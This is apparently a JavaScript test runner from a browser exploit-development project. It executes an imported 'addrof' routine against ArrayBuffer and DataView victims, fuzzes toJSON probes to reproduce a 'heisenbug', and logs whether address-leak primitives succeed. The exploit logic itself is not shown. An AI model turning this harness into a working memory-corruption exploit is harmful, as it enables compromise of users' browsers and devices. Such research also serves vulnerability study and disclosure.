// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import {
    executeTypedArrayVictimAddrofTest_AnalyzeSideChannelFuzz, // ATUALIZADO para v63
    FNAME_MODULE_TYPEDARRAY_ADDROF_V63_ASCF // ATUALIZADO para v63
} from './testArrayBufferVictimCrash.mjs';

async function runHeisenbugReproStrategy_TypedArrayVictim() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_AnalyzeSideChannelFuzz";
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug (AnalyzeSideChannelFuzz) ====`, 'test', FNAME_RUNNER);

    const result = await executeTypedArrayVictimAddrofTest_AnalyzeSideChannelFuzz();

    // Agora result.all_probe_calls_for_analysis deve estar correto
    logS3(`  Total de chamadas da sonda toJSON: ${result.total_probe_calls || 0}`, "info", FNAME_RUNNER);
    if (result.all_probe_calls_for_analysis && result.all_probe_calls_for_analysis.length > 0) {
        logS3(`  Detalhes de TODAS as chamadas da sonda: ${JSON.stringify(result.all_probe_calls_for_analysis, null, 2)}`, "dev_verbose");
    } else {
        logS3(`  Nenhum detalhe de chamada da sonda foi retornado para o runner.`, "warn", FNAME_RUNNER);
    }


    if (result.errorCapturedMain) {
        logS3(`  RESULTADO: ERRO JS CAPTURADO: ${result.errorCapturedMain.name} - ${result.errorCapturedMain.message}.`, "error", FNAME_RUNNER);
        document.title = `Heisenbug (TypedArray-ASCF) ERR: ${result.errorCapturedMain.name}`;
    } else {
        logS3(`  RESULTADO: Completou. Stringify Output Final (Parseado): ${result.stringifyResult ? JSON.stringify(result.stringifyResult, null, 2) : 'N/A'}`, "good", FNAME_RUNNER);

        let heisenbugConfirmed = false;
        // Priorizar se o fuzzing foi capturado
        const fuzzCaptured = result.all_probe_calls_for_analysis && result.all_probe_calls_for_analysis.find(d => (d.this_is_leak_target_AB || d.this_is_leak_target_DV) && d.fuzz_capture_status !== null);
        if (fuzzCaptured) {
             logS3(`  !!!! ALVO DE LEAK (${fuzzCaptured.this_type}) TEVE FUZZING CAPTURADO (Call #${fuzzCaptured.call_number}) !!!!`, "critical", FNAME_RUNNER);
             heisenbugConfirmed = true;
        } else {
            // Fallback para checar se C1 foi populado
            const call1Details = result.all_probe_calls_for_analysis && result.all_probe_calls_for_analysis.find(d => d.call_number === 1);
             if (call1Details && (call1Details.payload_AB || call1Details.payload_DV)) {
                logS3(`  INDICAÇÃO DE HEISENBUG: C1_details foi populado com payloads na Call #1.`, "info", FNAME_RUNNER);
                heisenbugConfirmed = true;
            } else {
                 logS3(`  ALERT: Nenhuma indicação clara de Heisenbug (alvo como 'this' com fuzz capturado ou C1 modificado).`, "error", FNAME_RUNNER);
            }
        }


        let anyAddrofSuccess = (result.addrof_A_result && result.addrof_A_result.success) || (result.addrof_B_result && result.addrof_B_result.success);

        if (result.addrof_A_result) {
            logS3(`    ADDROF A (ArrayBuffer): ${result.addrof_A_result.msg}`, result.addrof_A_result.success ? "vuln" : "warn", FNAME_RUNNER);
        }
        if (result.addrof_B_result) {
            logS3(`    ADDROF B (DataView): ${result.addrof_B_result.msg}`, result.addrof_B_result.success ? "vuln" : "warn", FNAME_RUNNER);
        }

        if (anyAddrofSuccess) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V63_ASCF}: Addr SUCCESS!`;
        } else if (heisenbugConfirmed) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V63_ASCF}: Heisenbug OK, Addr Fail`;
        } else {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V63_ASCF}: No Heisenbug?`;
        }
    }
    logS3(`  Título da página: ${document.title}`, "info");
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    logS3(`==== Estratégia de Reprodução do Heisenbug (AnalyzeSideChannelFuzz) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V63_ASCF}_MainOrchestrator`;
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== User Agent: ${navigator.userAgent} ====`,'info', FNAME_ORCHESTRATOR);
    logS3(`==== INICIANDO Script 3 (${FNAME_ORCHESTRATOR}): Reproduzindo Heisenbug com TypedArray Vítima (AnalyzeSideChannelFuzz) ====`, 'test', FNAME_ORCHESTRATOR);

    await runHeisenbugReproStrategy_TypedArrayVictim();

    logS3(`\n==== Script 3 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    if (runBtn) runBtn.disabled = false;

    if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V63_ASCF)) {
        if (!document.title.includes("CRASH") && !document.title.includes("RangeError") &&
            !document.title.includes("SUCCESS") && !document.title.includes("Addr Fail") &&
            !document.title.includes("ERR") && !document.title.includes("Heisenbug OK")) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V63_ASCF} Concluído`;
        }
    }
}
